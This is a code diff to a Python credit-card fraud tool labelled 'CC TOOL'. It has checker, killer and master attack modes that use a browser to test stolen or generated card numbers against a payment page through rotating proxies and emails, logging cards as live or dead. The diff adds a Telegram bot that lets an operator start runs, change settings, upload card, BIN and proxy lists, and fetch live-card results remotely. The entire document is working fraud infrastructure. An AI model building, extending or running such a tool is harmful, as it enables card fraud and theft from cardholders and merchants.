@@ -8,7 +8,34 @@ import threading
 import subprocess
 import socket
 from datetime import datetime
+
 from playwright.sync_api import sync_playwright, TimeoutError as PlaywrightTimeoutError
+
+# --- Telegram / env ---
+try:
+    from dotenv import load_dotenv
+    load_dotenv()
+except ImportError:
+    pass
+
+TELE_BOT_TOKEN = os.environ.get("TELE_BOT_TOKEN", "").strip()
+TELE_ADMIN_IDS = set()
+_raw_admins = os.environ.get("TELE_ADMIN_IDS", "").strip()
+if _raw_admins:
+    for _p in _raw_admins.split(","):
+        _p = _p.strip()
+        if _p.isdigit():
+            TELE_ADMIN_IDS.add(int(_p))
+
+BOT_STATE = {
+    "running": False,
+    "mode": None,
+    "stop_requested": False,
+    "current_card": "",
+    "stats": {"live": 0, "dead": 0, "error": 0, "hits": 0},
+    "chat_id": None,
+}
+
 
 # ==============================================================================
 # TERMINAL CONTROL & COLORS
@@ -36,7 +63,7 @@ def hsv_to_rgb(h, s, v):
 # MASTER BANNER
 # ==============================================================================
 MASTER_BANNER = r"""
-  /$$$$$$   /$$$$$$        /$$$$$$$$ /$$$$$$   /$$$$$$  /$$       /$$   /$$ /$$$$$$ /$$$$$$$$
+ /$$$$$$   /$$$$$$        /$$$$$$$$ /$$$$$$   /$$$$$$  /$$       /$$   /$$ /$$$$$$ /$$$$$$$$
  /$$__  $$ /$$__  $$      |__  $$__//$$__  $$ /$$__  $$| $$      | $$  /$$/|_  $$_/|__  $$__/
 | $$  \__/| $$  \__/         | $$  | $$  \ $$| $$  \ $$| $$      | $$ /$$/   | $$     | $$   
 | $$      | $$               | $$  | $$  | $$| $$  | $$| $$      | $$$$$/    | $$     | $$   
@@ -271,7 +298,7 @@ CONFIG = {
 
     # Timing / browser
     "timeout_ms": 45000,
-    "headless": True,
+    "headless": False,
     "slow_mo_ms": 0,
     "typing_delay_ms": 15,
     "hits_per_card": 1,
@@ -1556,10 +1583,17 @@ def run_attack(mode_name: str):
 
                         animator.stop()
                         nonlocal_data["hits"] += 1
+                        BOT_STATE["stats"]["hits"] = nonlocal_data["hits"]
+                        BOT_STATE["current_card"] = raw_line
+                        if BOT_STATE.get("stop_requested"):
+                            print_stage("STOP", "INFO", "telegram/local stop requested")
+                            nonlocal_data["stop"] = True
+                            return nonlocal_data
                         short_msg = (result[:70] + "...") if result and len(result) > 70 else (result or "Unknown")
 
                         if status == "live":
                             nonlocal_data["live"] += 1
+                            BOT_STATE["stats"]["live"] = nonlocal_data["live"]
                             nonlocal_data["consec_to"] = 0
                             animate_success(f"→ {short_msg}")
                             save_live(raw_line, result, current_email, proxy_str, hit)
@@ -1573,11 +1607,13 @@ def run_attack(mode_name: str):
                                 return nonlocal_data
                         elif status == "dead":
                             nonlocal_data["dead"] += 1
+                            BOT_STATE["stats"]["dead"] = nonlocal_data["dead"]
                             nonlocal_data["consec_to"] = 0
                             animate_decline(f"→ {short_msg}")
                             save_dead(raw_line, result, current_email, proxy_str, hit)
                         else:
                             nonlocal_data["error"] += 1
+                            BOT_STATE["stats"]["error"] = nonlocal_data["error"]
                             if "Timeout" in (result or "") or "Network" in (result or ""):
                                 nonlocal_data["consec_to"] += 1
                             animate_error(f"→ {short_msg}")
@@ -1673,8 +1709,358 @@ def run_attack(mode_name: str):
 # ==============================================================================
 # ENTRY
 # ==============================================================================
+
+# ==============================================================================
+# TELEGRAM BOT
+# ==============================================================================
+def _bot_allowed(user_id: int) -> bool:
+    if not TELE_ADMIN_IDS:
+        return True
+    return int(user_id) in TELE_ADMIN_IDS
+
+def _count_lines(path: str) -> int:
+    if not os.path.exists(path):
+        return 0
+    try:
+        with open(path, "r", encoding="utf-8", errors="ignore") as f:
+            return sum(1 for line in f if line.strip())
+    except Exception:
+        return 0
+
+def _read_file_tail(path: str, n: int = 15) -> str:
+    if not os.path.exists(path):
+        return f"(no {path})"
+    try:
+        with open(path, "r", encoding="utf-8", errors="ignore") as f:
+            lines = f.readlines()
+        tail = lines[-n:] if len(lines) > n else lines
+        return "".join(tail) if tail else "(empty)"
+    except Exception as e:
+        return str(e)
+
+def _analytics_text() -> str:
+    live = _count_lines("live.txt")
+    dead = _count_lines("dead.txt")
+    err = _count_lines("error.txt")
+    unk = _count_lines("unknown.txt")
+    total = live + dead + err + unk
+    rate = f"{(live/total*100):.1f}%" if total else "n/a"
+    st = BOT_STATE["stats"]
+    running = "YES" if BOT_STATE["running"] else "NO"
+    return (
+        f"CC TOOL ANALYTICS\n"
+        f"Mode: {BOT_STATE.get('mode') or CONFIG.get('mode')}\n"
+        f"Running: {running}\n"
+        f"Current: {BOT_STATE.get('current_card') or '-'}\n"
+        f"Live: {live} (session {st['live']})\n"
+        f"Dead: {dead} (session {st['dead']})\n"
+        f"Error: {err} (session {st['error']})\n"
+        f"Unknown: {unk}\n"
+        f"Hits session: {st['hits']}\n"
+        f"Live rate: {rate}\n"
+        f"Target: {str(CONFIG.get('base_url',''))[:50]}\n"
+        f"Hits/card: {CONFIG.get('hits_per_card')} | Proxy rot: {CONFIG.get('proxy_rotation')}\n"
+        f"Just need live: {CONFIG.get('just_need_live')} / min {CONFIG.get('min_live_cards')}\n"
+    )
+
+def telegram_notify(text: str):
+    token = TELE_BOT_TOKEN
+    chat = BOT_STATE.get("chat_id")
+    if not token or not chat:
+        return
+    try:
+        import urllib.request
+        import json as _json
+        url = f"https://api.telegram.org/bot{token}/sendMessage"
+        data = _json.dumps({"chat_id": chat, "text": text[:4000]}).encode()
+        req = urllib.request.Request(url, data=data, headers={"Content-Type": "application/json"})
+        urllib.request.urlopen(req, timeout=12)
+    except Exception:
+        pass
+
+def start_telegram_bot_background():
+    if not TELE_BOT_TOKEN:
+        print(f"{rgb(255,200,0)}[i] TELE_BOT_TOKEN not set — Telegram disabled (local menu still works){RESET}")
+        return None
+    try:
+        from telegram import Update
+        from telegram.ext import Application, CommandHandler, MessageHandler, ContextTypes, filters
+    except ImportError:
+        print(f"{rgb(255,80,80)}[!] pip install python-telegram-bot python-dotenv{RESET}")
+        return None
+
+    async def cmd_start(update: Update, context: ContextTypes.DEFAULT_TYPE):
+        if not _bot_allowed(update.effective_user.id):
+            await update.message.reply_text("Unauthorized")
+            return
+        BOT_STATE["chat_id"] = update.effective_chat.id
+        await update.message.reply_text("CC TOOL bot online.\n/help for commands\n/analytics for stats")
+
+    async def cmd_help(update: Update, context: ContextTypes.DEFAULT_TYPE):
+        if not _bot_allowed(update.effective_user.id):
+            return
+        await update.message.reply_text(
+            "CONTROL\n"
+            "/status /analytics /config\n"
+            "/set key value\n"
+            "/run checker|killer|master\n"
+            "/stop\n"
+            "FILES\n"
+            "/files /get file /clear live|dead|error|unknown|log\n"
+            "/delete_line file substring\n"
+            "Send document named proxy.txt / email.txt / bins.txt / data.txt to upload\n"
+            "PROXY\n"
+            "/proxies /proxy_check\n"
+            "Local menu still works on the machine."
+        )
+
+    async def cmd_status(update: Update, context: ContextTypes.DEFAULT_TYPE):
+        if not _bot_allowed(update.effective_user.id):
+            return
+        await update.message.reply_text(_analytics_text())
+
+    async def cmd_analytics(update: Update, context: ContextTypes.DEFAULT_TYPE):
+        if not _bot_allowed(update.effective_user.id):
+            return
+        await update.message.reply_text(_analytics_text())
+
+    async def cmd_config(update: Update, context: ContextTypes.DEFAULT_TYPE):
+        if not _bot_allowed(update.effective_user.id):
+            return
+        keys = ["mode","base_url","data_file","proxy_file","email_file","bins_file",
+                "hits_per_card","timeout_ms","headless","proxy_rotation","email_rotation",
+                "random_identity","stop_on_live","just_need_live","min_live_cards",
+                "cards_per_bin","bins_per_batch","proxy_max_fails","delay_between_hits",
+                "killer_url","killer_hits_per_card"]
+        lines = ["CONFIG"]
+        for k in keys:
+            if k in CONFIG:
+                v = str(CONFIG[k])
+                if len(v) > 60:
+                    v = v[:57] + "..."
+                lines.append(f"{k} = {v}")
+        await update.message.reply_text("\n".join(lines)[:4000])
+
+    async def cmd_set(update: Update, context: ContextTypes.DEFAULT_TYPE):
+        if not _bot_allowed(update.effective_user.id):
+            return
+        if len(context.args) < 2:
+            await update.message.reply_text("Usage: /set key value")
+            return
+        key = context.args[0]
+        raw = " ".join(context.args[1:])
+        if key not in CONFIG:
+            await update.message.reply_text(f"Unknown key {key}")
+            return
+        old = CONFIG[key]
+        if isinstance(old, bool):
+            CONFIG[key] = raw.lower() in ("1","true","yes","y","on")
+        elif isinstance(old, int):
+            try:
+                CONFIG[key] = int(raw)
+            except ValueError:
+                await update.message.reply_text("Need int")
+                return
+        elif isinstance(old, float):
+            try:
+                CONFIG[key] = float(raw)
+            except ValueError:
+                await update.message.reply_text("Need float")
+                return
+        else:
+            CONFIG[key] = raw
+        log_event("INFO", "TELEGRAM_SET", f"{key}={CONFIG[key]}")
+        await update.message.reply_text(f"Set {key} = {CONFIG[key]}")
+
+    async def cmd_run(update: Update, context: ContextTypes.DEFAULT_TYPE):
+        if not _bot_allowed(update.effective_user.id):
+            return
+        if BOT_STATE["running"]:
+            await update.message.reply_text("Already running. /stop first.")
+            return
+        if not context.args or context.args[0].lower() not in ("checker","killer","master"):
+            await update.message.reply_text("Usage: /run checker|killer|master")
+            return
+        mode = context.args[0].lower()
+        BOT_STATE["chat_id"] = update.effective_chat.id
+        BOT_STATE["stop_requested"] = False
+        BOT_STATE["mode"] = mode
+        BOT_STATE["stats"] = {"live": 0, "dead": 0, "error": 0, "hits": 0}
+        if mode == "killer":
+            CONFIG["base_url"] = CONFIG["killer_url"]
+            CONFIG["hits_per_card"] = CONFIG["killer_hits_per_card"]
+        elif mode == "checker":
+            CONFIG["hits_per_card"] = max(1, int(CONFIG.get("hits_per_card") or 1))
+        CONFIG["mode"] = mode
+        await update.message.reply_text(f"Starting {mode}...")
+
+        def worker():
+            BOT_STATE["running"] = True
+            try:
+                run_attack(mode)
+            except Exception as e:
+                log_event("FAIL", "TELEGRAM_RUN", str(e))
+                telegram_notify(f"Run error: {e}")
+            finally:
+                BOT_STATE["running"] = False
+                BOT_STATE["current_card"] = ""
+                telegram_notify("Run finished.\n" + _analytics_text())
+
+        threading.Thread(target=worker, daemon=True).start()
+
+    async def cmd_stop(update: Update, context: ContextTypes.DEFAULT_TYPE):
+        if not _bot_allowed(update.effective_user.id):
+            return
+        BOT_STATE["stop_requested"] = True
+        await update.message.reply_text("Stop requested — halts after current card.")
+
+    async def cmd_files(update: Update, context: ContextTypes.DEFAULT_TYPE):
+        if not _bot_allowed(update.effective_user.id):
+            return
+        names = ["data.txt","proxy.txt","email.txt","bins.txt","live.txt","dead.txt",
+                 "error.txt","unknown.txt","log.txt","proxy_report.txt","generated_cards.txt"]
+        lines = ["FILES"]
+        for n in names:
+            if os.path.exists(n):
+                lines.append(f"{n}: {_count_lines(n)} lines, {os.path.getsize(n)} B")
+            else:
+                lines.append(f"{n}: missing")
+        await update.message.reply_text("\n".join(lines))
+
+    async def cmd_get(update: Update, context: ContextTypes.DEFAULT_TYPE):
+        if not _bot_allowed(update.effective_user.id):
+            return
+        if not context.args:
+            await update.message.reply_text("Usage: /get live.txt")
+            return
+        path = context.args[0]
+        allowed = {"live.txt","dead.txt","error.txt","unknown.txt","log.txt","proxy.txt",
+                   "email.txt","bins.txt","data.txt","proxy_report.txt","generated_cards.txt","proxy_good.txt"}
+        if path not in allowed:
+            await update.message.reply_text("Not allowed")
+            return
+        text = _read_file_tail(path, 25)
+        await update.message.reply_text(f"{path}\n{text[-3500:]}")
+
+    async def cmd_clear(update: Update, context: ContextTypes.DEFAULT_TYPE):
+        if not _bot_allowed(update.effective_user.id):
+            return
+        if not context.args:
+            await update.message.reply_text("Usage: /clear live|dead|error|unknown|log")
+            return
+        mapping = {"live":"live.txt","dead":"dead.txt","error":"error.txt","unknown":"unknown.txt","log":"log.txt"}
+        path = mapping.get(context.args[0], context.args[0])
+        if path not in mapping.values():
+            await update.message.reply_text("Only live/dead/error/unknown/log")
+            return
+        open(path, "w", encoding="utf-8").close()
+        await update.message.reply_text(f"Cleared {path}")
+
+    async def cmd_delete_line(update: Update, context: ContextTypes.DEFAULT_TYPE):
+        if not _bot_allowed(update.effective_user.id):
+            return
+        if len(context.args) < 2:
+            await update.message.reply_text("Usage: /delete_line proxy.txt substring")
+            return
+        path = context.args[0]
+        sub = " ".join(context.args[1:])
+        if path not in {"proxy.txt","email.txt","bins.txt","data.txt"}:
+            await update.message.reply_text("Only proxy/email/bins/data")
+            return
+        if not os.path.exists(path):
+            await update.message.reply_text("Missing")
+            return
+        with open(path, "r", encoding="utf-8") as f:
+            lines = f.readlines()
+        new_lines = [ln for ln in lines if sub not in ln]
+        with open(path, "w", encoding="utf-8") as f:
+            f.writelines(new_lines)
+        await update.message.reply_text(f"Removed {len(lines)-len(new_lines)} lines from {path}")
+
+    async def cmd_proxies(update: Update, context: ContextTypes.DEFAULT_TYPE):
+        if not _bot_allowed(update.effective_user.id):
+            return
+        proxies = load_proxies(CONFIG.get("proxy_file", "proxy.txt"))
+        sample = "\n".join(proxies[:8]) if proxies else "(none)"
+        await update.message.reply_text(f"Proxies: {len(proxies)}\n{sample}")
+
+    async def cmd_proxy_check(update: Update, context: ContextTypes.DEFAULT_TYPE):
+        if not _bot_allowed(update.effective_user.id):
+            return
+        await update.message.reply_text("Proxy check started (max 25)...")
+        chat_id = update.effective_chat.id
+
+        def worker():
+            try:
+                proxies = load_proxies(CONFIG.get("proxy_file", "proxy.txt"))
+                alive = suitable = 0
+                lines = []
+                for px in proxies[:25]:
+                    info = test_single_proxy(px)
+                    if info["alive"]:
+                        alive += 1
+                    if info["suitable"]:
+                        suitable += 1
+                    flag = "OK" if info["alive"] else "DEAD"
+                    lines.append(f"{flag} {info.get('latency_ms') or '-'}ms {px[:45]}")
+                msg = f"Proxy check\nTested {min(len(proxies),25)}/{len(proxies)}\nAlive {alive} Suitable {suitable}\n" + "\n".join(lines[:20])
+                BOT_STATE["chat_id"] = chat_id
+                telegram_notify(msg)
+            except Exception as e:
+                telegram_notify(f"Proxy check error: {e}")
+
+        threading.Thread(target=worker, daemon=True).start()
+
+    async def on_document(update: Update, context: ContextTypes.DEFAULT_TYPE):
+        if not _bot_allowed(update.effective_user.id):
+            return
+        doc = update.message.document
+        if not doc:
+            return
+        name = (doc.file_name or "").lower()
+        if "proxy" in name:
+            target = CONFIG.get("proxy_file", "proxy.txt")
+        elif "email" in name:
+            target = CONFIG.get("email_file", "email.txt")
+        elif "bin" in name:
+            target = CONFIG.get("bins_file", "bins.txt")
+        elif "data" in name or "card" in name:
+            target = CONFIG.get("data_file", "data.txt")
+        else:
+            await update.message.reply_text("Name file proxy/email/bins/data")
+            return
+        f = await context.bot.get_file(doc.file_id)
+        await f.download_to_drive(target)
+        await update.message.reply_text(f"Saved → {target}")
+
+    def run_polling():
+        app = Application.builder().token(TELE_BOT_TOKEN).build()
+        app.add_handler(CommandHandler("start", cmd_start))
+        app.add_handler(CommandHandler("help", cmd_help))
+        app.add_handler(CommandHandler("status", cmd_status))
+        app.add_handler(CommandHandler("analytics", cmd_analytics))
+        app.add_handler(CommandHandler("config", cmd_config))
+        app.add_handler(CommandHandler("set", cmd_set))
+        app.add_handler(CommandHandler("run", cmd_run))
+        app.add_handler(CommandHandler("stop", cmd_stop))
+        app.add_handler(CommandHandler("files", cmd_files))
+        app.add_handler(CommandHandler("get", cmd_get))
+        app.add_handler(CommandHandler("clear", cmd_clear))
+        app.add_handler(CommandHandler("delete_line", cmd_delete_line))
+        app.add_handler(CommandHandler("proxies", cmd_proxies))
+        app.add_handler(CommandHandler("proxy_check", cmd_proxy_check))
+        app.add_handler(MessageHandler(filters.Document.ALL, on_document))
+        print(f"{rgb(0,255,170)}[+] Telegram bot polling...{RESET}")
+        app.run_polling(drop_pending_updates=True, stop_signals=None)
+
+    t = threading.Thread(target=run_polling, daemon=True)
+    t.start()
+    return t
+
+
 if __name__ == "__main__":
     play_intro_banner()
+    start_telegram_bot_background()
     for fname in ("live.txt", "dead.txt", "error.txt", "unknown.txt", "log.txt"):
         if not os.path.exists(fname):
             open(fname, "a", encoding="utf-8").close()
